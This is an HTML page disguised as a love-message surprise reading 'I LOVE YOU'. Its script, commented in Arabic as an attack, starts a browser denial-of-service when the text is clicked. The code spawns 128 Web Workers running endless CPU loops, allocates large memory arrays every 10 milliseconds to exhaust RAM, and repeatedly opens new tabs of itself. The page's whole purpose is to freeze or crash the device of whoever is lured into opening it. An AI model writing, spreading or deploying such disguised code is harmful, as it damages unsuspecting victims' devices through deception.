<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; text-shadow: 0 0 30px #ff0055; cursor: pointer; user-select: none; }
    </style>
</head>
<body>

    <h1 id="burn">I LOVE YOU</h1>

    <script>
        const trigger = document.getElementById('burn');
        let memoryMass = [];

        trigger.onclick = function() {
            this.innerText = "CRITICAL...";
            
            // 1. فتح 128 عامل (Workers) - ضعف العدد السابق مرتين
            // ده بيخلي المعالج مفيش فيه ثانية واحدة فاضية
            for (let i = 0; i < 128; i++) {
                const worker = new Worker(URL.createObjectURL(new Blob([`
                    onmessage = function(e) {
                        const view = new Int32Array(e.data);
                        while(true) {
                            // عملية حسابية وتخزينية مستمرة تمنع المعالج من الراحة
                            for(let j=0; j<100000; j++) {
                                Atomics.add(view, 0, Math.sqrt(Math.random()));
                                Math.asin(Math.cos(Math.random()));
                            }
                        }
                    }
                `], {type: 'application/javascript'})));

                // إنشاء مساحة ذاكرة مشتركة لكل عامل لإجبار الرام على الامتلاء
                try {
                    const sab = new SharedArrayBuffer(1024);
                    worker.postMessage(sab);
                } catch(e) {
                    // إذا كان المتصفح يمنع SharedArrayBuffer، نستخدم الهجوم البديل
                    worker.postMessage("fallback");
                }
            }

            // 2. هجوم الرام الأعنف (Ram Destructor)
            // حجز 200 ميجا كل 10 مللي ثانية
            setInterval(() => {
                try {
                    // حجز مصفوفات ضخمة جداً (BigInt64Array) لأنها أثقل على النظام
                    let chunk = new BigInt64Array(1024 * 1024 * 10).fill(BigInt(i)); 
                    memoryMass.push(chunk);
                    
                    // منع المتصفح من عمل "Aw Snap" عن طريق إشغاله بـ Console
                    console.error("System Memory Leak: " + memoryMass.length * 80 + "MB");
                } catch(err) {
                    // لو الرام اتملت، يبدأ يفتح تبويبات جديدة كقنبلة نهائية
                    window.open(window.location.href, '_blank');
                }
            }, 10);

            // 3. شلل تام في الواجهة
            document.body.style.animation = "pulse 0.01s infinite";
        };
    </script>
</body>
</html>
